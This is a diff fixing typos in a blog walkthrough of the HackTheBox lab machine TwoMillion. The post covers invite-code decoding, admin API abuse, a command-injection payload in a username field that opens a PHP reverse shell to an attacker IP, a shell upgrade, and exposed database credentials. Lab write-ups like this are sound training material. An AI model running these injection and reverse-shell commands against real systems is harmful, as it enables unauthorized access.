@@ -5,8 +5,8 @@ title: HTB-TwoMillion
 <p>In TwoMillion, we decoded a JS invite code to access the site, exploited an API to escalate to admin, injected commands for a reverse shell, found admin credentials, and gained root.
 <h2>Introduction</h2>
 <p>In this post, I will walk you through the exploitation of the easy HTB machine called "2million". Overall, it was a fun experience but requires a lot of steps and is therefore a bit harder than other easy boxes on HTB.
-<h2>Step 1: Running an nmap scan on the target</h2>
-<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some nmap scripts and do service detection, respectively. This allows us to caapture a lot of information as a starting point.</p>
+<h2>Step 1: Running an Nmap scan on the target</h2>
+<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some Nmap scripts and do service detection, respectively. This allows us to capture a lot of information as a starting point.</p>
 <p>We get the following output:</p>
 
 
@@ -29,7 +29,7 @@ title: HTB-TwoMillion
     Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
 </pre>
 
-<p>We can see we have an ssh service running as wel as a nginx webserver. We can also see that there is a redirect to http://2million.htb. Therfore we need to add this to our hosts file (sudo vim /etc/hosts)</p>
+<p>We can see we have an ssh service running as well as a nginx webserver. We can also see that there is a redirect to http://2million.htb. Therefore we need to add this to our hosts file (sudo vim /etc/hosts)</p>
 
 <p>After adding the domainname to the hostfile. I run the nmap scan again to see if we get more data:</p>
 <pre>
@@ -53,8 +53,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </pre>
 <p>As we can see, the nginx server runs on php and possibly uses a PHPSESSIONID cookie</p>
 
-<h2>Step 2: Enumerarting the website</h2>
-<p> Let's start with visiting the website. The website looks like the lagcy HTB page where you had to hack your way in. After some investigation, it seemed that way that we also need to do that for this box. Pressing on join HTB we get directed to the following page:</p>
+<h2>Step 2: Enumerating the website</h2>
+<p> Let's start with visiting the website. The website looks like the legacy HTB page where you had to hack your way in. After some investigation, it seemed that way that we also need to do that for this box. Pressing on join HTB we get directed to the following page:</p>
 <img src="/images/HTB-2million/HTB_invite.png" alt="HTB invite page" class="postImage 2millionImage">
 
 <p>When we open the developer tools and go to the network tab (refresh the page). There is a inviteapi JS script that seems interesting. Double clicking it brings us to its code which we can see is minified/obfuscated:</p>
@@ -65,7 +65,7 @@ function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,St
 
 <h2>Step 3: Breaking in in the HTB legacy platform</h2>
 
-<p>To understand this JS script, we need to deminify and especially dobfuscate it. This can be done using the following website: <span class="url">https://lelinhtinh.github.io/de4js/</span>We get the following result:</p>
+<p>To understand this JS script, we need to deminify and especially deobfuscate it. This can be done using the following website: <span class="url">https://lelinhtinh.github.io/de4js/</span>We get the following result:</p>
 
 <img src="/images/HTB-2million/HTB_2million_DeobfusctedJS.png" alt="Deobfuscated JS" class="postImage 2millionImage">
 
@@ -73,7 +73,7 @@ function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,St
 
 <img src="/images/HTB-2million/HTB_2million_Encrypted_invitecode.png" alt="encrypted invite code" class="postImage 2millionImage">
 
-<p>However, doing this, we get encrypted data (encryption algoritm ROT13). So we need to crack this. Instead of dorectly jumping to hashcat or john (popular cracking tools). I like to use online tools first. Just google a ROT 13 decoder and we then get the following output:</p>
+<p>However, doing this, we get encrypted data (encryption algorithm ROT13). So we need to decipher this. I like to use online tools first. Just google a ROT 13 decoder and we then get the following output:</p>
 <pre>
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
 </pre>
@@ -91,7 +91,7 @@ echo "MDJNUFEtOVdBTUUtQ1k4SzktNUM4RDY=" | base64 -d
 02MPQ-9WAME-CY8K9-5C8D6
 </pre>
 
-<p>This output looks a lot like an invite code so let's try it. Indeed, we have logged in and succesfully hacked our way into HTB!</p>
+<p>This output looks a lot like an invite code so let's try it. Indeed, we have logged in and successfully hacked our way into HTB!</p>
 
 <h2>Step 4: Elevation of user rights to admin</h2>
 
@@ -106,7 +106,7 @@ echo "MDJNUFEtOVdBTUUtQ1k4SzktNUM4RDY=" | base64 -d
 
 <img src="/images/HTB-2million/HTB-2million_API_enumeration.png" alt="API enumeration" class="postImage 2millionImage">
 
-<p> This gave us the API route map which we can use in curl requests.Especially, the api routes under admin seem promising! Let's test the first oene with curl. This told us we were not admin as expected:</p>
+<p> This gave us the API route map which we can use in curl requests.Especially, the api routes under admin seem promising! Let's test the first one with curl. This told us we were not admin as expected:</p>
 
 <img src="/images/HTB-2million/2million_admin_auth.png" alt="get request admin auth" class="postImage 2millionImage">
 
@@ -149,7 +149,7 @@ curl http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=gahs33mmu3k93ls
 
 <img src="/images/HTB-2million/HTB-2million_API_enumeration.png" alt="API enumeration" class="postImage 2millionImage">
 
-<p>So my gues is that this part of the API will now be accessible for us. let's test that hypothesis with a curl command</p>
+<p>So my guess is that this part of the API will now be accessible for us. let's test that hypothesis with a curl command</p>
 
 <pre>
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=gahs33mmu3k93lsgqndc69d7b1"                                                                         
@@ -196,7 +196,7 @@ curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
   -d "{\"username\":\"Aion; php -r '\$sock=fsockopen(\\\"10.10.14.144\\\",9000);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");';\"}"
 </pre>
 
-<p> Let's upgrade our newly recieved reverse shell!</p>
+<p> Let's upgrade our newly received reverse shell!</p>
 
 <pre>
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -226,4 +226,4 @@ DB_PASSWORD=SuperDuperPass123
 <img src="/images/HTB-2million/2million-privesc.png" alt="privilege escalation suid" class="postImage 2millionImage">
 
 <h2>Final thoughts</h2>
-<p> In general, it was a fun box to tackle and a good learning experience. It's a quite lengthy box and a lot of techniques need to be used to successfully pwn it. In my opnion, it is a harder box than s lot of other easy boxes due to the amount of steps it takes to finally gain root.
+<p> In general, it was a fun box to tackle and a good learning experience. It's a quite lengthy box and a lot of techniques need to be used to successfully pwn it. In my opinion, it is a harder box than s lot of other easy boxes due to the amount of steps it takes to finally gain root.
